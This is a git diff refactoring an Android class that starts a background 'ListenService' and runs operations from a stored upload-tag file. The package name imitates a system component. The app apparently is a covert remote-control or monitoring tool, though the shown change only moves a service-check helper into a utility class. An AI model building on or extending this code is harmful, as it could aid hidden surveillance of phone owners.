@@ -11,6 +11,7 @@ import android.os.Environment;
 import com.android.system.controled.service.ListenService;
 import com.android.system.controled.util.DoAboutCodeUtils;
 import com.android.system.controled.util.FileUtil;
+import com.android.system.controled.util.ServiceUtil;
 
 public class Globle {
 
@@ -85,7 +86,7 @@ public class Globle {
 
 		// ContactsUtil.createContactsFile(context);//测试
 
-		if (!isServiceStarted(context, SERVICE_NAME_LISTEN)) {
+		if (!ServiceUtil.isServiceStarted(context, SERVICE_NAME_LISTEN)) {
 			Intent i = new Intent(context, ListenService.class);
 			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 			context.startService(i);
@@ -100,26 +101,6 @@ public class Globle {
 		if (Globle.FILE_TAG_UPLOAD_TAG.exists()) {
 			DoAboutCodeUtils.doOperaByMessage(context, FileUtil.read(FILENAME_TAG_UPLOAD_TAG, context));
 		}
-	}
-
-	/**
-	 * 通过Service的类名来判断是否启动某个服务
-	 * 
-	 * @param mServiceList
-	 * @param className
-	 * @return
-	 */
-	public static boolean isServiceStarted(Context context, String serviceName) {
-
-		ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
-		List<ActivityManager.RunningServiceInfo> mServiceList = activityManager.getRunningServices(100);
-
-		for (int i = 0; i < mServiceList.size(); i++) {
-			if (serviceName.equals(mServiceList.get(i).service.getClassName())) {
-				return true;
-			}
-		}
-		return false;
 	}
 
 }
